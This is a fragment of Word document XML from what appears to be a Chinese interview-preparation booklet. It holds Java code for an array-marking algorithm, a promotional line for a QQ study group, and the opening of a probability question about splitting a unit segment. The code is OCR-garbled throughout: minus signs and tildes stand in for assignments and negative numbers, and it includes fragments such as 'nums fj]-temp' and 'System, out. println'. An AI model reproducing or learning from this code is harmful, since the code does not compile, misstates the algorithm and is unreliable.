        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~4;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">} else { nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>"6;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>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both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">case </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>-4:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if (isOdd == true) { nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">} else { nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~7;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>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both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case ~5:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums[index] = "6;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>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both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case "6：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Q</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2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>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both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case -7：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~8;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>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0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>default：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>swap(nums, i, index);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if (isOdd) { nums[index]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11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">} else { nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~3;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="252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2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>continue;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="16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40" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums[i++]=0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>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1260" w:right="0" w:hanging="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static void swap(int[] nums, int i, int j) { int temp =nums[i];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums[i]=nums[j];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="620" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums fj]-temp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="840"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static void print(int[] nums) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:hanging="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; nums.length; i++) { if (nums[i] == ~2) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>System, out. println(i * 2 + 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>} else if (nums[i] == -6) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:headerReference r:id="rId5" w:type="default"/>
          <w:headerReference r:id="rId6" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1520" w:right="1870" w:bottom="1565" w:left="1675" w:header="0" w:footer="1137" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>System, out. println(i * 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="1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零声学「謐理出品</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="525" w:lineRule="exact"/>
        <w:ind w:left="1760" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>更多、更全面试学习技术资料清加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">群：762073882 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>} else if (nums[i] == ~8) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>System, out. println(L * 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1680" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>System, out. println(i * 2 + 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="425"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="bookmark21"/>
      <w:bookmarkEnd w:id="19"/>
      <w:bookmarkStart w:id="20" w:name="bookmark22"/>
      <w:bookmarkStart w:id="21" w:name="bookmark20"/>
      <w:bookmarkStart w:id="22" w:name="bookmark19"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>长度为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的线段，随机在其上选择两点，将线段分为三段,</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
